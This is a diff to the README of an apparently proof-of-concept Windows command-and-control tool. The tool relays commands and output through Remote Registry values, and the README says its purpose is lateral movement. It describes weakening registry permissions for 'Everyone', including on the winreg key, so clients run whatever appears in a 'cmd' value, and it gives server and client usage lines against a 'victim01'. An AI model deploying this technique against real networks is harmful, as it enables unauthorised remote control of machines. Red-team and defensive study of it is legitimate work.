@@ -20,30 +20,32 @@ The Remote Registry Service needs to be enabled on the server, and the user tryi
 Since the traffic is based on RPC, it should only be suitable for lateral movement on local networks, however I have not tested it over the internet. 
 
 ### How it works:
-1. When the server starts, the Remote Registry Service is enabled. 
-2. The registry key HKEY_LOCAL_MACHINE\Software\RegistryC2\<user-defined name> is created along with the following registry values: cmd, output & sleep. 
-3. Permissions are then set for the user "Everyone" on the newly created registry key and, importantly, the registry key: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg. This ensures that the client can authenticate to the server and has access to the relevant registry values. On exiting the server, the permissions are removed again. 
-4. The client will then check for the value at "sleep" to determine how often to check it. 
-5. The client checks the "cmd" value at the server, executes it and writes the result to the output value on the server. 
-6. While running, the server will look for new updates to the "output" value and prints it back to the attacker.
+1. When the server starts, the Remote Registry Service is enabled and started. 
+2. The registry key HKEY_LOCAL_MACHINE\Software\RegistryC2\<user-defined> is created along with the following registry values: cmd, output & sleep. 
+3. Permissions are then set for the user "Everyone" on the newly created registry key.
+4. Permissions are then likewise set on the key: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg. This ensures that the client any client can authenticate to the server. (N.B. On exiting/closing of the server, these permissions are removed again.) 
+5. The client will then check the C2 server for the value of "sleep" to determine how often to check it. 
+6. The client then executes whatever command found in the "cmd"-value. 
+7. The result of the command is written as a string to the C2's "output" value. 
+8. While running, the server will look for new updates to the "output" value and prints it back to the attacker.
 
 ### Usage:
 **Setup the server (listener):**
 ``` 
 RegC2Server.exe <Unique Registry key name to use>
-RegC2Server.exe dc01
+RegC2Server.exe victim01
 ```
 **Client-side:**
 ```
-RegC2Client.exe <host> <Registry name to use>
-RegC2Client.exe dc01 ws01
+RegC2Client.exe <host> <Registry name used to start the server>
+RegC2Client.exe ws01 victim01
 ```
 
 **Since this is a POC, only the following commands have been implemented:**
 ```
 >help
 sleep <int>      Set the sleep time to the value of int
-cmd <cmd>        cmd to execute
+cmd <command>    cmd to execute
 exit             Exit the application gracefully
 ```
 
